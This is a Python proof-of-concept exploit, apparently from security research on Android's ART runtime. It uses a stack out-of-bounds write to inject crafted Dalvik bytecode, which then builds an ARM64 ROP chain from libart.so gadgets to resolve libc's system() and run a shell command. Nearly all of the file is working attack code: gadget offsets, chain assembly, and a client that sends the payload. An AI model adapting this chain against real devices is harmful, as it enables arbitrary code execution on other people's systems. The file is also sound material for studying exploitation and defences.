#!/usr/bin/env python3

# Goal: Show that bytecode can function as an intermediate stage for stronger/classic ROP attack.
# Notice: ROP by itself would have been hard, if not impossible, to pull off, because there are no leaks of executable memory.

# Uses poc_remote's stack - index oob write primitive
# Exploit Idea:
# 1. Create bytecode locally that encodes ROP gadgets for libc.so's `system(command)`
#   1. ROP gadgets are written into "some" return address on the stack using bytecode and vrefs
#   2. Base address of libart.so is computed using a spilled return address on the stack
#   3. ROP gadgets are relocated using the base address of libc.so
# 2. ROP chain injects command string into writable memory
# 3. ROP chain resolves libc.so base address (or `system` directly)
# 4. ROP chain triggers execution of `system(command)`


from pwn import *
from client import PwnClient
from bcbuilder import BytecodeBuilder
from typing import List
from typing import Tuple


def wait_for_debugger() -> None:
    input('<enter>')


def write_qword(client: PwnClient, index: int, value: int) -> None:
    assert (value & (2**64 - 1)) == value, f'{hex(value)} does not fit into qword.'
    assert (index & (2**32 - 1)) == index, f'{hex(index)} does not fit into dword.'
    assert (index >= 0), f'{index} must be non - negative.'
    client.send_int(1)  # stay in receive loop
    client.send_int(index)  # choose index
    client.send_long(value) # choose qword to write to stack


def write_bytes(client: PwnClient, base_index: int, buffer: bytes) -> None:
    assert (buffer)
    buffer += b'\x00' * (8 - (len(buffer) % 8))
    for i in range(len(buffer) // 8):
        write_qword(client, base_index + i, u64(buffer[8 * i: 8 * (i + 1)]))


def build_leak_libart_base(
        builder: BytecodeBuilder,
        return_address_vref_index: int,
        return_address_offset: int,
        num_vregs: int,
        libc_base_vreg_index: int) -> bytes:
    assert (num_vregs >= 4)
    v0 = 0
    v2 = 2

    # 1. Grab spilled return address into libart.so from stack using vreg oob (not memory error!)
    builder = (builder.move_wide16(v0, return_address_vref_index - num_vregs)
                      .const_wide(v2, return_address_offset)
                      .sub_long(v0, v0, v2))
    if libc_base_vreg_index != 0:
        return builder.move_wide16(libc_base_vreg_index, v0)
    return builder


def build_rop_chain(
        builder: BytecodeBuilder,
        return_address_vref_index: int,
        num_vregs: int,
        libart_base_vreg_index: int,
        libart_got_plt_offset: int,
        libart_got_plt_system_offset: int,
        command: bytes,
        libart_writable_memory: int) -> bytes:
    # Gadgets are encoded via integer addition of ROP gadget offset and libart base vreg
    # Use ROP chain to find libc base address via .got.plt@libart
    # The first entry (i.e. at offset 0x18) of .got.plt@libart holds:
    # 0x000072ee80f300â”‚+0x0018   <__cxa_finalize@got.plt+0000> 0x00000075936cce60
    # which is located in /apex/com.android.runtime/lib64/bionic/libc.so, i.e. libc.so

    # Assuming there is enough space for bytecode - based computations
    # between start of vrefs and return address. Otherwise we would
    # sabotage our own ROP chain. It may also be possible to move
    # computations "far out of the way", i.e. e.g. starting at vregs 0x200.
    assert (return_address_vref_index >= 4)

    # 0x0000000000211ab0: ldp x20, x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret; 
    gadget_ldp_x20_x19_ldp_x29_x30 = 0x211ab0

    # 0x000000000020fad4: ldp x0, x30, [sp], #0x20; ret; 
    gadget_ldp_x0_x30 = 0x20fad4

    # 0x0000000000731f20: mov x8, x0; mov x0, x8; ldp x29, x30, [sp], #0x10; ret; 
    gadget_mov_x8_x0_mov_x0_x8 = 0x731f20

    # 0x000000000028dac0: ldr x0, [x0, #8]; ldp x29, x30, [sp], #0x10; ret; 
    gadget_mov_x0_deref_x0_plus_8 = 0x28dac0

    # 0x00000000006f1ecc: sub x0, x0, x8; ldp x29, x30, [sp], #0x20; ret; 
    gadget_sub_x0_x0_x8 = 0x6f1ecc

    # 0x0000000000299df8: br x8; 
    gadget_br_x8 = 0x299df8

    # 0x000000000071da14: str x0, [x19]; ldp x20, x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret; 
    gadget_str_x0_x19_ldp_x20_x19_ldp_x29_x30 = 0x71da14


    # Pad command with null bytes to at least 8 bytes
    command += (8 - (len(command) % 8)) * b'\x00'

    gadgets: List[Tuple[bool, int]] = [
        (True, gadget_ldp_x0_x30),

        # Ctx: gadget_ldp_x0_x30
        # Sem: x0 := <first command chunk>
        (False, u64(command[:8])),  # x0 := <first command chunk>
        (True, gadget_ldp_x20_x19_ldp_x29_x30), # x30 := next gadget address
        (False, 0), # Skipped
        (False, 0), # Skipped

        # Ctx: gadget_ldp_x20_x19_ldp_x29_x30
        # Sem: x19 := <writable memory>
        (False, 0), # x29 := <unused>
        (True, gadget_str_x0_x19_ldp_x20_x19_ldp_x29_x30),  # x30 := next gadget address
        (False, 0), # x20 := <unused>
        (True, libart_writable_memory), # x19 := <relocated writable memory in libart.so>
    ]
    
    for i in range(len(command) // 8):
        gadgets += [
            # Ctx: gadget_str_x0_x19_ldp_x20_x19_ldp_x29_x30
            # Sem: *x19 := x0
            (False, 0), # x29 := <unused>
            (True, gadget_ldp_x0_x30),  # x30 := next gadget address
            (False, 0), # x20 := <unused>
            (True, libart_writable_memory + (i + 1) * 8), # x19 := <relocated writable memory of next command chunk>
        ]

        # Skip trailing x0 gadget, because this is not used anymore
        if i < (len(command) // 8) - 1:
            gadgets += [
                # Ctx: gadget_ldp_x0_x30
                # Sem: x0 := <next command chunk>
                (False, u64(command[(i + 1) * 8 : (i + 2) * 8])),   # x0 := <next command chunk
                (True, gadget_str_x0_x19_ldp_x20_x19_ldp_x29_x30),
                (False, 0), # Skipped
                (False, 0) # Skipped
            ]
    
    # Invariant: Previous command setup ends with call to gadget_ldp_x0_x30
    gadgets += [
        # Ctx: gadget_ldp_x0_x30
        # Sem: x0 := libart_got_plt_system_offset
        (False, libart_got_plt_system_offset),  # x0 := libart_got_plt_system_offset
        (True, gadget_mov_x8_x0_mov_x0_x8), # x30 := next gadget address
        (False, 0), # Skipped
        (False, 0), # Skipped

        # Ctx: gadget_mov_x8_x0_mov_x0_x8
        # Sem: x8 := x0
        (False, 0), # x29 := <unused>
        (True, gadget_ldp_x0_x30),  # x30 := next gadget address

        # Ctx: gadget_ldp_x0_x30
        # Sem: x0 := __cxa_finalize@got.plt of libart.so
        # Note: Uses relocation mechanism to relocate gadget parameters during ROP chain construction
        (True, libart_got_plt_offset - 8),  # x0 := __cxa_finalize@got.plt of libart.so - 8 (account for +8 in deref gadget)
        (True, gadget_mov_x0_deref_x0_plus_8),  # x30 := next gadget address
        (False, 0), # Skipped
        (False, 0), # Skipped

        # Ctx: gadget_mov_x0_deref_x0_plus_8
        # Sem: x0 := *(x0 + 8)
        (False, 0), # x29 := <unused>
        (True, gadget_sub_x0_x0_x8),

        # Ctx: gadget_sub_x0_x0_x8
        # Sem: x0 := x0 - x8
        (False, 0), # x29 := <unused>
        (True, gadget_mov_x8_x0_mov_x0_x8),
        (False, 0), # Skipped
        (False, 0), # Skipped

        # Ctx: gadget_mov_x8_x0_mov_x0_x8
        # Sem: x8 := x0
        (False, 0), # x29 := <unused>
        (True, gadget_ldp_x0_x30),

        # Ctx: gadget_ldp_x0_x30
        # Sem: x0 := <command>
        (True, libart_writable_memory), # x0 := <relocated command string>
        (True, gadget_br_x8),
        (False, 0), # Skipped
        (False, 0), # Skipped

        # Ctx: gadget_br_x8
        # Sem: system(x0)
        # Done
    ]

    # Use v2, v3 to perform addition
    v2 = 2

    # Writing to r0 is equivalent to setting the object of v0
    return_address_vreg_index = return_address_vref_index
    for index, (relocate, gadget) in enumerate(gadgets):
        if relocate:
            builder = (builder.const_wide(v2, gadget)
                            .add_long(v2, v2, libart_base_vreg_index)
                            .move_object16(2 * index + return_address_vreg_index, v2)
                            .move_object16(2 * index + return_address_vreg_index + 1, v2 + 1))
        else:
            builder = (builder.const_wide(v2, gadget)
                            .move_object16(2 * index + return_address_vreg_index, v2)
                            .move_object16(2 * index + return_address_vreg_index + 1, v2 + 1))


    return builder

def main():
    client = PwnClient('127.0.0.1', 8080)
    try:
        wait_for_debugger()

        # Pointer leak
        leak: int = client.receive_long()
        print(f'Leak: {hex(leak)}')

        # Construct JITROP shellcode
        command = b'log "HELLO"'
        return_address_vref_index = 0x00c0 // 4
        return_address_offset = 0x20a258 # offset to base address of libart.so
        libart_base_vreg_index = 0 # v0 := libc base
        num_vregs = 4
        libart_cxa_finalize_got_plt_offset = 0x18
        libart_cxa_finalize_offset = 0x0080f2e8 + libart_cxa_finalize_got_plt_offset
        libart_got_system_offset = 0x5f480  # offset of __cxa_finalize@got.plt from libart.so to system in libc.so
        libart_writable_memory = 0xa10700

        builder = BytecodeBuilder()
        builder = build_leak_libart_base(
            builder,
            return_address_vref_index,
            return_address_offset,
            num_vregs,
            libart_base_vreg_index
        )
        builder = build_rop_chain(
            builder,
            return_address_vref_index,
            num_vregs,
            libart_base_vreg_index,
            libart_cxa_finalize_offset,
            libart_got_system_offset,
            command,
            libart_writable_memory
        )
        shellcode = builder.return_void().build()

        # Write bytecode to stack
        shellcode_index = 0x1000
        shellcode_address = leak + shellcode_index * 8

        print(f'Shellcode index: {hex(shellcode_index)}')
        print(f'Shellcode address: {hex(shellcode_address)}')
        wait_for_debugger()
        write_bytes(client, shellcode_index, shellcode)

        # Overwrite bytecode return address to kick off shellcode execution
        # Account for invoke - bytecode instruction after return
        dex_pc_index = 0x11
        shellcode_return_address = shellcode_address - 6

        print(f'Dex PC index: {hex(dex_pc_index)}')
        print(f'Shellcode return address: {hex(shellcode_return_address)}')
        wait_for_debugger()
        write_qword(client, dex_pc_index, shellcode_return_address)

        # For debugging purposes, because running into client.close() may
        # terminate app and thus debugger.
        wait_for_debugger()

    finally:
        client.close()


if __name__ == '__main__':
    main()